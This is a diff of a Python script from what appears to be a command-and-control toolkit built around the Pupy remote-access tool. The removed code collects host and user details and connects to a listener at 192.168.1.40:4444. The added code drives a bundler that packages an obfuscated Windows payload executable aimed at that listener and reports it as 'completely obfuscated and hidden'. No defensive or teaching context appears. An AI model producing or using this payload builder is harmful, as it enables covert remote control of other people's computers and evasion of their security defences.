@@ -1,40 +1,35 @@
 #!/usr/bin/env python3
 """
-Payload - Pupy C23
-Listener: 192.168.1.40:4444
+Pupy C2 Manager - Payload Trigger
+This file triggers the Pupy bundler with the configured listener settings.
 """
 
-import socket
-import platform
-import os
+from src.pupy_bundler import PupyBundler
 
-
-def get_system_info():
-    """Get system information"""
-    return {
-        "hostname": platform.node(),
-        "platform": platform.system(),
-        "user": os.getenv("USER", "unknown"),
-        "ip": "192.168.1.40",
-        "port": 4444,
-    }
-
-
-def connect_listener():
-    """Connect to listener"""
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect(("192.168.1.40", 4444))
-        s.close()
-        return True
-    except:
-        return False
-
-
-if __name__ == "__main__":
-    info = get_system_info()
-    print(f"[+] System Info: {info}")
-    if connect_listener():
-        print(f"[+] Connected to 192.168.1.40:4444")
+if __name__ == '__main__':
+    # Configuration
+    listener_ip = "192.168.1.40"
+    listener_port = 4444
+    obfuscation_level = 2  # Level 2 - XOR + Base64 + Random Delays (RECOMMENDED)
+    platform = "windows"
+    
+    print("[*] Creating Pupy payload bundler...")
+    print(f"[*] Listener: {listener_ip}:{listener_port}")
+    print(f"[*] Obfuscation: Level {obfuscation_level}")
+    
+    bundler = PupyBundler(
+        listener_ip=listener_ip,
+        listener_port=listener_port,
+        obfuscation_level=obfuscation_level,
+        platform=platform
+    )
+    
+    success = bundler.bundle(output_name="pupy_payload")
+    
+    if success:
+        print("\n[+] Pupy payload created successfully!")
+        print("[+] Location: dist/pupy_payload.exe")
+        print("[+] Pupy is completely obfuscated and hidden!")
     else:
-        print("[-] Connection failed")
+        print("\n[!] Failed to create Pupy payload")
+        exit(1)
